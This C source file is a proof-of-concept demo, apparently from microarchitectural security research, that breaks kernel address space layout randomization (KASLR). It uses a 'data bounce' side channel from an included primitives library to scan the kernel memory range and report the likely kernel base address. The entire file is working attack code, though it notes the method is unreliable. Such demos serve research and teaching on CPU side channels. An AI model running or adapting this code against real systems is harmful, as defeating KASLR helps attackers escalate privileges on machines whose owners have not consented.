#include "../primitives/basic_primitives.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>

#define ADDRESS_RANGE_START (void*) 0xffffffff80000000ull
#define KASLR_ALIGNMENT 0x100000ll
#define REPS 2000


int main() {
    if (!fallout_compatible()) {
        printf("Your Processor Architecture is not supported by this demo!\n");
        return 1;
    }
    void *addr = ADDRESS_RANGE_START;
    int page_size = getpagesize();
    uint8_t *mem = aligned_alloc(page_size, page_size * 256);
    memset(mem, 0xFF, page_size * 256);
    fallout_init();
    printf("Demo 4: Breaking KASLR (without access to /proc/kallsyms)\n");
    uint64_t delta = 0;
    int hit_threshold = data_bounce(mem, addr + delta, REPS) + 8;
    char *loading = "-\\|/";
    while (1) {
        printf("[%p... %c]                     \r", addr + delta, loading[(delta / KASLR_ALIGNMENT) % 4]);
        fflush(stdout);
        int hits = data_bounce(mem, addr + delta, REPS);
        if (hits >= hit_threshold) {
            if (hits > hit_threshold * 2) {
                printf("An unusual amount of hits was detected at %p, so it is likely that this is your kernel's base address.\n",
                       addr + delta);
                break;
            }
            hit_threshold = hits;
        }
        delta += KASLR_ALIGNMENT;
        if (delta > UINT64_MAX - (uint64_t)addr){
            printf("There was no significant increase in data bounce hits anywhere in the kernel's memory region, so KASLR was not broken.\n");
            printf("Note that this method tends to be unreliable, so restarting the demo might yield different results.\n");
            break;
        }
    }
    free(mem);
    fallout_cleanup();
    return 0;
}
